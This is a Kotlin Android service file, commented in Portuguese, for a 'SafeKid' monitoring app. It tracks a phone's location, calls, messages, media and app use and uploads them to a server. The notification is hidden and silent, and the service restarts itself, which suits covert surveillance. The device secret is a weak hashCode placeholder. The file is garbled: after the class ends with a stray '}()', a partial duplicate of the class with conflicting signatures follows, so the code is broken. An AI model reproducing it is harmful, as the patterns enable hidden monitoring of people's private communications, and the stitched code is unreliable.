package com.safekid.monitor.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.safekid.monitor.BuildConfig
import com.safekid.monitor.R
import com.safekid.monitor.SafeKidApplication
import com.safekid.monitor.data.api.ApiService
import com.safekid.monitor.data.preferences.AppPreferences
import com.safekid.monitor.managers.*
import com.safekid.monitor.utils.DeviceUtils
import kotlinx.coroutines.*
import org.koin.android.ext.android.inject
import timber.log.Timber
import java.util.concurrent.TimeUnit

class MonitoringService : LifecycleService() {

    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "monitoring_service"
        private const val HEARTBEAT_INTERVAL = 5 * 60 * 1000L // 5 minutos
        private const val DATA_SYNC_INTERVAL = 15 * 60 * 1000L // 15 minutos

        fun start(context: Context) {
            val intent = Intent(context, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, MonitoringService::class.java)
            context.stopService(intent)
        }
    }

    // Injeção de dependências
    private val preferences: AppPreferences by inject()
    private val apiService: ApiService by inject()
    
    // Managers para diferentes tipos de monitoramento
    private lateinit var locationManager: LocationManager
    private lateinit var callManager: CallManager
    private lateinit var messageManager: MessageManager
    private lateinit var mediaManager: MediaManager
    private lateinit var appManager: AppManager
    
    // Jobs para tarefas periódicas
    private var heartbeatJob: Job? = null
    private var dataSyncJob: Job? = null
    private var monitoringJob: Job? = null

    private var isServiceRunning = false

    override fun onCreate() {
        super.onCreate()
        Timber.d("MonitoringService criado")

        // Criar canal de notificação
        createNotificationChannel()

        // Inicializar managers
        initializeManagers()

        // Iniciar serviço em foreground
        startForeground(NOTIFICATION_ID, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        
        if (!isServiceRunning) {
            startMonitoring()
        }

        // Retornar START_STICKY para reiniciar automaticamente se morto pelo sistema
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopMonitoring()
        Timber.d("MonitoringService destruído")
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Serviço de Monitoramento",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Serviço em execução para monitoramento"
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setShowBadge(false)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SafeKid")
            .setContentText("Serviço ativo")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun initializeManagers() {
        try {
            locationManager = LocationManager(this, preferences)
            callManager = CallManager(this, preferences)
            messageManager = MessageManager(this, preferences)
            mediaManager = MediaManager(this, preferences)
            appManager = AppManager(this, preferences)
            
            Timber.d("Managers inicializados com sucesso")
        } catch (e: Exception) {
            Timber.e(e, "Erro ao inicializar managers")
        }
    }

    private fun startMonitoring() {
        if (isServiceRunning) return

        isServiceRunning = true
        Timber.d("Iniciando monitoramento...")

        // Iniciar monitoramento contínuo
        monitoringJob = lifecycleScope.launch {
            try {
                // Iniciar todos os managers
                startAllManagers()

                // Iniciar heartbeat
                startHeartbeat()

                // Iniciar sincronização de dados
                startDataSync()

                Timber.d("Monitoramento iniciado com sucesso")
            } catch (e: Exception) {
                Timber.e(e, "Erro ao iniciar monitoramento")
                stopSelf()
            }
        }
    }

    private fun stopMonitoring() {
        if (!isServiceRunning) return

        isServiceRunning = false
        Timber.d("Parando monitoramento...")

        // Cancelar jobs
        heartbeatJob?.cancel()
        dataSyncJob?.cancel()
        monitoringJob?.cancel()

        // Parar managers
        stopAllManagers()

        Timber.d("Monitoramento parado")
    }

    private suspend fun startAllManagers() {
        try {
            // Iniciar localização
            locationManager.startLocationTracking()

            // Iniciar monitoramento de chamadas
            callManager.startCallMonitoring()

            // Iniciar monitoramento de mensagens
            messageManager.startMessageMonitoring()

            // Iniciar monitoramento de mídia
            mediaManager.startMediaMonitoring()

            // Iniciar monitoramento de apps
            appManager.startAppMonitoring()

        } catch (e: Exception) {
            Timber.e(e, "Erro ao iniciar managers")
        }
    }

    private fun stopAllManagers() {
        try {
            locationManager.stopLocationTracking()
            callManager.stopCallMonitoring()
            messageManager.stopMessageMonitoring()
            mediaManager.stopMediaMonitoring()
            appManager.stopAppMonitoring()
        } catch (e: Exception) {
            Timber.e(e, "Erro ao parar managers")
        }
    }

    private fun startHeartbeat() {
        heartbeatJob = lifecycleScope.launch {
            while (isServiceRunning) {
                try {
                    sendHeartbeat()
                    delay(HEARTBEAT_INTERVAL)
                } catch (e: Exception) {
                    Timber.e(e, "Erro no heartbeat")
                    delay(30000) // Tentar novamente em 30 segundos
                }
            }
        }
    }

    private fun startDataSync() {
        dataSyncJob = lifecycleScope.launch {
            while (isServiceRunning) {
                try {
                    syncPendingData()
                    delay(DATA_SYNC_INTERVAL)
                } catch (e: Exception) {
                    Timber.e(e, "Erro na sincronização de dados")
                    delay(60000) // Tentar novamente em 1 minuto
                }
            }
        }
    }

    private suspend fun sendHeartbeat() {
        try {
            val deviceInfo = SafeKidApplication.instance.getDeviceInfo()
            val heartbeatData = mapOf(
                "device_uuid" to deviceInfo["uuid"],
                "status" to "online",
                "timestamp" to System.currentTimeMillis(),
                "battery_level" to DeviceUtils.getBatteryLevel(this),
                "network_type" to DeviceUtils.getNetworkType(this),
                "app_version" to BuildConfig.VERSION_NAME
            )

            val response = apiService.sendHeartbeat(
                deviceId = deviceInfo["uuid"].toString(),
                deviceUuid = deviceInfo["uuid"].toString(),
                deviceSecret = generateDeviceSecret(),
                data = heartbeatData
            )

            if (response.isSuccessful) {
                Timber.d("Heartbeat enviado com sucesso")
                preferences.updateLastHeartbeat(System.currentTimeMillis())
            } else {
                Timber.w("Falha no heartbeat: ${response.code()}")
            }
        } catch (e: Exception) {
            Timber.e(e, "Erro ao enviar heartbeat")
        }
    }

    private suspend fun syncPendingData() {
        try {
            Timber.d("Iniciando sincronização de dados pendentes...")

            // Sincronizar dados de localização
            locationManager.syncPendingLocations()

            // Sincronizar chamadas
            callManager.syncPendingCalls()

            // Sincronizar mensagens
            messageManager.syncPendingMessages()

            // Sincronizar mídias
            mediaManager.syncPendingMedia()

            // Sincronizar dados de apps
            appManager.syncPendingAppData()

            Timber.d("Sincronização de dados concluída")
        } catch (e: Exception) {
            Timber.e(e, "Erro na sincronização de dados")
        }
    }

    private fun generateDeviceSecret(): String {
        val deviceUuid = preferences.getDeviceUuid()
        val timestamp = System.currentTimeMillis()
        val data = "$deviceUuid:$timestamp"
        
        // TODO: Implementar CryptoUtils.createHMAC quando disponível
        return "${deviceUuid}_${timestamp}".hashCode().toString()
    }

    // Verificar se o serviço deve continuar rodando
    private fun shouldKeepRunning(): Boolean {
        return preferences.isAppConfigured() && 
               preferences.isMonitoringEnabled() &&
               DeviceUtils.isNetworkAvailable(this)
    }

    // Método para reiniciar o serviço se necessário
    fun restartIfNeeded() {
        if (!isServiceRunning && shouldKeepRunning()) {
            startMonitoring()
        }
    }

    // Verificações de integridade do serviço
    private fun performHealthCheck(): Boolean {
        try {
            // Verificar conectividade
            if (!DeviceUtils.isNetworkAvailable(this)) {
                Timber.w("Sem conectividade de rede")
                return false
            }

            // Verificar se todos os managers estão funcionando
            val managersHealthy = listOf(
                locationManager.isHealthy(),
                callManager.isHealthy(),
                messageManager.isHealthy(),
                mediaManager.isHealthy(),
                appManager.isHealthy()
            ).all { it }

            if (!managersHealthy) {
                Timber.w("Alguns managers não estão saudáveis")
                return false
            }

            // Verificar último heartbeat
            val lastHeartbeat = preferences.getLastHeartbeat()
            val timeSinceLastHeartbeat = System.currentTimeMillis() - lastHeartbeat
            if (timeSinceLastHeartbeat > HEARTBEAT_INTERVAL * 2) {
                Timber.w("Heartbeat atrasado")
                return false
            }

            return true
        } catch (e: Exception) {
            Timber.e(e, "Erro na verificação de saúde")
            return false
        }
    }

    // Auto-recuperação em caso de problemas
    private fun performSelfRecovery() {
        lifecycleScope.launch {
            try {
                Timber.d("Iniciando auto-recuperação...")

                // Parar tudo
                stopMonitoring()
                delay(5000)

                // Reinicializar
                initializeManagers()
                delay(2000)

                // Reiniciar monitoramento
                startMonitoring()

                Timber.d("Auto-recuperação concluída")
            } catch (e: Exception) {
                Timber.e(e, "Erro na auto-recuperação")
                // Se falhar, tentar reiniciar o serviço completamente
                stopSelf()
                delay(10000)
                start(this@MonitoringService)
            }
        }
    }

    // Task de verificação periódica
    private fun startHealthCheckTask() {
        lifecycleScope.launch {
            while (isServiceRunning) {
                delay(TimeUnit.MINUTES.toMillis(10)) // Verificar a cada 10 minutos
                
                if (!performHealthCheck()) {
                    Timber.w("Health check falhou, iniciando auto-recuperação")
                    performSelfRecovery()
                }
            }
        }
    }

    // Obter status do serviço
    fun getServiceStatus(): Map<String, Any> {
        return mapOf(
            "is_running" to isServiceRunning,
            "last_heartbeat" to preferences.getLastHeartbeat(),
            "last_sync" to preferences.getLastSync(),
            "managers_status" to mapOf(
                "location" to (::locationManager.isInitialized && locationManager.isHealthy()),
                "calls" to (::callManager.isInitialized && callManager.isHealthy()),
                "messages" to (::messageManager.isInitialized && messageManager.isHealthy()),
                "media" to (::mediaManager.isInitialized && mediaManager.isHealthy()),
                "apps" to (::appManager.isInitialized && appManager.isHealthy())
            ),
            "device_info" to DeviceUtils.getDeviceInfo(this)
        )
    }
}()
            messageManager.stopMessageMonitoring()
            mediaManager.stopMediaMonitoring()
            appManager.stopAppMonitoring()
        } catch (e: Exception) {
            Timber.e(e, "Erro ao parar managers")
        }
    }

    private fun startHeartbeat() {
        heartbeatJob = lifecycleScope.launch {
            while (isServiceRunning) {
                try {
                    sendHeartbeat()
                    delay(HEARTBEAT_INTERVAL)
                } catch (e: Exception) {
                    Timber.e(e, "Erro no heartbeat")
                    delay(30000) // Tentar novamente em 30 segundos
                }
            }
        }
    }

    private fun startDataSync() {
        dataSyncJob = lifecycleScope.launch {
            while (isServiceRunning) {
                try {
                    syncPendingData()
                    delay(DATA_SYNC_INTERVAL)
                } catch (e: Exception) {
                    Timber.e(e, "Erro na sincronização de dados")
                    delay(60000) // Tentar novamente em 1 minuto
                }
            }
        }
    }

    private suspend fun sendHeartbeat() {
        try {
            val deviceInfo = SafeKidApplication.instance.getDeviceInfo()
            val heartbeatData = mapOf(
                "device_uuid" to deviceInfo["uuid"],
                "status" to "online",
                "timestamp" to System.currentTimeMillis(),
                "battery_level" to DeviceUtils.getBatteryLevel(this),
                "network_type" to DeviceUtils.getNetworkType(this),
                "app_version" to BuildConfig.VERSION_NAME
            )

            val response = apiService.sendHeartbeat(
                deviceUuid = deviceInfo["uuid"] ?: "",
                data = heartbeatData
            )

            if (response.isSuccessful) {
                Timber.d("Heartbeat enviado com sucesso")
                preferences.updateLastHeartbeat(System.currentTimeMillis())
            } else {
                Timber.w("Falha no heartbeat: ${response.code()}")
            }
        } catch (e: Exception) {
            Timber.e(e, "Erro ao enviar heartbeat")
        }
    }

    private suspend fun syncPendingData() {
        try {
            Timber.d("Iniciando sincronização de dados pendentes...")

            // Sincronizar dados de localização
            locationManager.syncPendingLocations()

            // Sincronizar chamadas
            callManager.syncPendingCalls()

            // Sincronizar mensagens
            messageManager.syncPendingMessages()

            // Sincronizar mídias
            mediaManager.syncPendingMedia()

            // Sincronizar dados de apps
            appManager.syncPendingAppData()

            Timber.d("Sincronização de dados concluída")
        } catch (e: Exception) {
            Timber.e(e, "Erro na sincronização de dados")
        }
    }

    // Verificar se o serviço deve continuar rodando
    private fun shouldKeepRunning(): Boolean {
        return preferences.isAppConfigured() && 
               preferences.isMonitoringEnabled() &&
               DeviceUtils.isNetworkAvailable(this)
    }

    // Método para reiniciar o serviço se necessário
    fun restartIfNeeded() {
        if (!isServiceRunning && shouldKeepRunning()) {
            startMonitoring()
        }
    }

    // Verificações de integridade do serviço
    private fun performHealthCheck(): Boolean {
        try {
            // Verificar conectividade
            if (!DeviceUtils.isNetworkAvailable(this)) {
                Timber.w("Sem conectividade de rede")
                return false
            }

            // Verificar se todos os managers estão funcionando
            val managersHealthy = listOf(
                locationManager.isHealthy(),
                callManager.isHealthy(),
                messageManager.isHealthy(),
                mediaManager.isHealthy(),
                appManager.isHealthy()
            ).all { it }

            if (!managersHealthy) {
                Timber.w("Alguns managers não estão saudáveis")
                return false
            }

            // Verificar último heartbeat
            val lastHeartbeat = preferences.getLastHeartbeat()
            val timeSinceLastHeartbeat = System.currentTimeMillis() - lastHeartbeat
            if (timeSinceLastHeartbeat > HEARTBEAT_INTERVAL * 2) {
                Timber.w("Heartbeat atrasado")
                return false
            }

            return true
        } catch (e: Exception) {
            Timber.e(e, "Erro na verificação de saúde")
            return false
        }
    }

    // Auto-recuperação em caso de problemas
    private fun performSelfRecovery() {
        lifecycleScope.launch {
            try {
                Timber.d("Iniciando auto-recuperação...")

                // Parar tudo
                stopMonitoring()
                delay(5000)

                // Reinicializar
                initializeManagers()
                delay(2000)

                // Reiniciar monitoramento
                startMonitoring()

                Timber.d("Auto-recuperação concluída")
            } catch (e: Exception) {
                Timber.e(e, "Erro na auto-recuperação")
                // Se falhar, tentar reiniciar o serviço completamente
                stopSelf()
                delay(10000)
                start(this@MonitoringService)
            }
        }
    }

    // Task de verificação periódica
    private fun startHealthCheckTask() {
        lifecycleScope.launch {
            while (isServiceRunning) {
                delay(TimeUnit.MINUTES.toMillis(10)) // Verificar a cada 10 minutos
                
                if (!performHealthCheck()) {
                    Timber.w("Health check falhou, iniciando auto-recuperação")
                    performSelfRecovery()
                }
            }
        }
    }
}